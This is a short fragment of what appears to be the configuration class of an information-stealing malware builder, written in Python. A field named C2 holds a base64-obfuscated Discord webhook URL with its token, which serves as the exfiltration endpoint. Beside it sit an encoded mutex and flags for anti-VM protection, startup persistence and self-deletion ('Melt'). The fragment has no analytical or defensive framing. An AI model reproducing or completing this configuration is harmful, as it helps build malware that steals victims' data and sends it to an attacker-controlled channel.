...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3MjU1NjkzNzQ2NDExOTM3OS9lVEtHUTQ2TFhLMDdZdUd3R3dJVE5hSkdwOUVxZ2hCdGFvQndGVGczVmcxaFhvOTA4d1BUV3pmMm9QeVBYYVQyWFMydg==').decode())
    Mutex = base64.b64decode('NkN6WFdEd204WG5IQ0w0RQ==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
